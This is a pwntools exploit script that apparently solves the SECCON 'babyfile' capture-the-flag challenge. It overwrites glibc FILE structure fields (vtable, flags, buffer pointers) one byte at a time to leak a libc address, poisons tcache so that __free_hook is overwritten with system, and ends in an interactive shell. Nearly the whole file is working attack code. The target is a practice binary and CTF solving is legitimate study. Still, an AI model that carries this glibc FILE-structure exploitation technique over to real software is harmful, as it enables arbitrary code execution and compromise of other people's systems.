from pwn import *

sendlineafter = lambda x, y: p.sendlineafter(x, y)
sendafter = lambda x, y: p.sendafter(x, y)
sendline = lambda x: p.sendline(x)
send = lambda x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('babyfile.seccon.games', 3157)
    # p = remote('localhost', 7777)
else:
    p = process(filepath, env={"LD_PRELOAD": "./libc-2.31.so"})
    
libc = ELF('./libc-2.31.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def dbg(p):
    gdb.attach(p)
    pause()

def flush():
    sendlineafter(b'> ', b'1')

def trick(ofs, v):
    sendlineafter(b'> ', b'2')
    sendlineafter(b': ', str(ofs).encode())
    sendlineafter(b': ', str(v).encode())

# vtable = _IO_file_jumps+120
trick(0xd8, 0x18)
trick(0xd9, 0xf5)

# _flags = 0xfbad1800
trick(0, 0)
trick(1, 0x18)

# _IO_write_ptr-_IO_write_base >= _IO_buf_end-_IO_buf_base
# _IO_write_ptr = 0xa00
trick(0x29, 10)
# _IO_buf_end = 0x200
trick(0x41, 2)

flush()
flush()

# vtable = _IO_file_jumps
trick(0xd8, 0xa0)
trick(0xd9, 0xf4)

# _fileno = 1
trick(0x70, 1)
# _IO_write_base = unsorted bin
trick(0x20, 0x70)
trick(0x21, 0x94)
flush()

libc.address = u64(p.recv(7).ljust(8, b'\0')) - 0x1e8f60
print(hex(libc.address))

# vtable = _IO_file_jumps+120
trick(0xd8, 0x18)
trick(0xd9, 0xf5)

# _IO_buf_base = fp
trick(0x38, 0xa0)
trick(0x39, 0x92)

# _IO_write_ptr > _IO_write_base
trick(0x29, 0xff)

# fp -> tcache (0x1e0)
flush()

# _IO_buf_base = fp
trick(0x38, 0xa0)
trick(0x39, 0x92)

# fp -> tcache (0x1e0)
flush()

# _IO_buf_base = 0
for i in range(8):
    trick(0x38+i, 0)
# _IO_buf_end = size
size = (0x1d0-100)//2
trick(0x40, size)
for i in range(7):
    trick(0x41+i, 0)

# _IO_write_ptr-_IO_write_base >= _IO_buf_end-_IO_buf_base
# _IO_write_ptr = size+1
trick(0x28, size+1)
for i in range(7):
    trick(0x29+i, 0)
# _IO_write_base = 0
for i in range(8):
    trick(0x20+i, 0)

# _flags 
addr = libc.symbols['__free_hook']-8
for i in range(8):
    trick(i, addr&0xff)
    addr >>= 8

# malloc(0x1d0)
flush()

# _flags
flags = 0xfbad1800
for i in range(8):
    trick(i, flags&0xff)
    flags >>= 8

# _IO_read_ptr  <- old_buf
addr = u64(b'/bin/sh\0')
for i in range(8):
    trick(0x8+i, addr&0xff)
    addr >>= 8

# _IO_read_end
addr = libc.symbols['system']
for i in range(8):
    trick(0x10+i, addr&0xff)
    addr >>= 8

# _IO_buf_base = fp + 8
trick(0x38, 0xa8)

# _IO_buf_end = _IO_buf_base + size
trick(0x40, 0x5e)
trick(0x41, 0x93)

# _IO_write_ptr-_IO_write_base >= _IO_buf_end-_IO_buf_base
# _IO_write_ptr = size+1
trick(0x28, size+1)
for i in range(7):
    trick(0x29+i, 0)
# _IO_write_base = 0
for i in range(8):
    trick(0x20+i, 0)

# vtable = _IO_file_jumps+120
addr = libc.address + 0x1e9518
for i in range(8):
    trick(i+0xd8, addr&0xff)
    addr >>= 8

# malloc(0x1d0)
flush()
p.interactive()
